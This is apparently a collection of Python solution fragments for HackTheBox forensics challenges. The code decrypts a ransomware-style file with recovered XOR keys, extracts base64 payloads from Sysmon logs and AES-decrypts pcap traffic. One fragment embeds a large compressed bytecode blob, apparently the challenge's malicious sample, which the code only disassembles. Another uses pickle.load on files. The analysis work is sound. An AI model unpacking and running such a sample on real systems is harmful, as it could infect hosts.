        # Read the encrypted .secured file (Base64-encoded)
        with open(self.challenge_file, &#34;rb&#34;) as f:

            encrypted_b64 = bytearray(f.read())

        encrypted_data = base64.b64decode(encrypted_b64)

        # Try decrypting with single key
        decrypted_data_1 = self.xor_decrypt(encrypted_data, key1)

        # Try decrypting with both keys (if key2 is usable)
        # So one key is weird because in the powershell script it tried to decode it with UTF-8 and i think that would lead to an error
        # So there is a chance that only one key is used due to the try-catch brackets leaving one key null but im not sure.
        key2_str = &#34;n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ&#34;

        try:
            key2 = base64.b64decode(key2_str)
            decrypted_data_2 = self.xor_decrypt(encrypted_data, key1, key2)
        except Exception as e:
            print(f&#34;[!] Dual-key decode failed: {e}&#34;)
            decrypted_data_2 = None

        # Save both outputs as .bin files for analysis
        output_single_key = self.folfil(&#34;data&#34;, &#34;output_single_key.bin&#34;)
        with open(output_single_key, &#34;wb&#34;) as f:
            f.write(decrypted_data_1)
            print(&#34;[+] Decrypted with single key -&gt; output_single_key.bin&#34;)

        if decrypted_data_2:
            output_dual_key = self.folfil(&#34;data&#34;, &#34;output_dual_key.bin&#34;)
            with open(output_dual_key, &#34;wb&#34;) as f:

                f.write(decrypted_data_2)
                print(&#34;[+] Decrypted with both keys -&gt; output_dual_key.bin&#34;)

        key3_b64 = &#34;5xsGObjHQiPAGdzLgBEeI8u0YSJq76Eiyuf8wARS7qbtP4ntQY50yH8dzKZeCAsZn2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ&#34;
        key3 = base64.b64decode(key3_b64)
        decrypted_data_3 = self.xor_decrypt(encrypted_data, key3)
        output_join_key = self.folfil(&#34;data&#34;, &#34;output_join_key.bin&#34;)
        with open(output_join_key, &#34;wb&#34;) as f:
            f.write(decrypted_data_3)
            print(&#34;[+] Decrypted with join key -&gt; output_join.bin&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def getting_base64(self):
        sysmon_file = self.Path(
            self.folders[&#34;data&#34;], &#34;emilia&#34;, &#34;Sysmon_Operational.txt&#34;
        )
        with open(sysmon_file, &#34;r&#34;) as f:
            text = f.read()
        base64_strings = self.custom_re_match_base64_string(text)

        result = b&#34;&#34;

        for base64_string in base64_strings:
            decoded = base64.b64decode(base64_string)
            result += decoded
        return result

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def custom_re_match_base64_string(self, text: str, strict=False) -&gt; list[str]:
        &#34;&#34;&#34;
        Description:
        Find the base64 string in the text

        Args:
            text (str): Text to search for base64 string
            strict (bool, optional): If True, it will only return the base64 string. Defaults to False.

        Returns:
            str: list of Base64 string found in the text
        &#34;&#34;&#34;
        if strict:
            base64_pattern = r&#34;[A-Za-z0-9+/]{70,}={1,2}&#34;
        else:
            base64_pattern = r&#34;[A-Za-z0-9+/]{70,}={0,2}&#34;
        base64_strings = re.findall(base64_pattern, text)
        return base64_strings

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def main(self):
        self.emilia_main()

        # /home/figaro/CTF/Categories/Forensics/HTB/Pursue_The_Tracks/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption_key = &#34;5UUfizsRsP7oOCAq&#34;

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def pickle_save_data(self, data: any, filename: str, folder: str = &#34;data&#34;) -&gt; None:
        &#34;&#34;&#34;
        Description:
            Save data to a pickle file

        Args:
            data (any): data to write to the pickle file. Can be anything
            filename (str): Filename to save
            folder (str, optional): Folder name inside the ctf folder. Defaults to &#34;data&#34;.

        Returns:
            None
        &#34;&#34;&#34;
        with open(self.folfil(folder, filename), &#34;wb&#34;) as f:
            pickle.dump(data, f)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def pickle_load_data(self, filename: str, folder: str = &#34;data&#34;) -&gt; any:
        &#34;&#34;&#34;
        Description:
            Load data from a pickle file

        Args:
            filename (str): Filename to load the data from
            folder (str, optional): Folder name to find the file to load the data from. Defaults to &#34;data&#34;.

        Returns:
            any: Data loaded from pickle
        &#34;&#34;&#34;
        with open(self.folfil(folder, filename), &#34;rb&#34;) as f:
            return pickle.load(f)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def load_compressed_data(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function to load the compressed data
        &#34;&#34;&#34;
        self.compressed_data = b&#39;BZh91AY&amp;SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4&#34;|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&amp;\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\&#39;\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&amp;F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&amp;\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&amp;M&amp;\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1&#34;\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df&gt;$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|&gt;\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo&#34;\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&amp;\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa&gt;E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0&#34;\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&amp;&amp;\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\&#39;\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm&lt;\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a&#34;J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18&gt;\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI&lt;\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80&lt;%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&amp;w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85&#34;.j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&amp;\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5&lt;\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08&lt;\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd&lt;q\r\xbb0\xc4Ac\x95.v\x94\x08&gt;\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&amp;\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q&#34;\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d&gt;\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0&gt;\xcf\&#39;7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02&#34;@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u&lt;\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|&gt;\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e&lt;\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c&#34;\x86\xa6\x9c&amp;,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff&#34;|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\&#39;\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r&gt;\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &amp;,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&amp;\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\&#39;\x04\xe0&amp;\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&amp;c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q \x8eZ\xd5p*-qC%\xec\x85aH\x90&gt;\xc1\x97%B@\x12B&#34;u\xd5R\x0f\x10`&amp;\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5&lt;\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\&#39;\x04\xc1l&amp;\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) \x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&amp;\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 @B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5&#34;Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82&#34;\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc&#34;\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&amp;\xe7NQ\x9e\&#39;93M\x8f`!\xcc\x80#%\x04\xd2\xeb&#34;T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&amp;\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{&gt;_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e&lt;\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\&#39;Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e&#34;\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9&gt;\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\&#39;\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 \x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2&#34;\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\&#39;\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\&#39;\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\&#39;;r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99&lt;)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12&lt;{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5&gt;&#34;\&#39;\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8&#34;\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&amp;|&gt;\x13(&lt;\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 \x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&amp;\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6&lt;\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18&lt;\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&amp;? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&amp;\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3&lt;\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04&lt;\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&amp;[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac&lt;N7)g\x9f\xc1\xd8p\xab\&#39;\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%&#34;p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c&lt;\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-&#34;\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&amp;+\xf7\x83Oj\x9d\xab\xb7Uh&#34;z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K&gt;qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\&#39;\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa5\xd3\x14O\xe0\x12\x06]&#34;\xb2\xa8\x82\xac`\&#39;L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00&#39;

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def demarshalling(self):
        &#34;&#34;&#34;
        Description:
            This function is used to demarshall the compressed data and display the disassembled code.
            Challenge specific function
        &#34;&#34;&#34;
        self.load_compressed_data()
        data = bz2.decompress(self.compressed_data)
        code = marshal.loads(data)

        print(dis.dis(code))

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def dec_file_mes(self, mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

        return unpad(cypher.decrypt(mes), 16)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

        Returns:
            dict: Dictionary of packets
        &#34;&#34;&#34;

        packets = None
        # Dictionary to hold packets
        packets_dict = {}

        if pcap_function == &#34;scapy&#34;:
            packets = rdpcap(pcap_file.as_posix())
        elif pcap_function == &#34;pyshark&#34;:
            packets = pyshark.FileCapture(pcap_file.as_posix())

        if raw:
            return packets

        for i, packet in enumerate(packets):
            packets_dict[i + 1] = packet

        return packets_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def smart_extract_packets(
        self,
        pcap_file,
        pcap_function: str,
        raw: bool = False,
        save: bool = False,
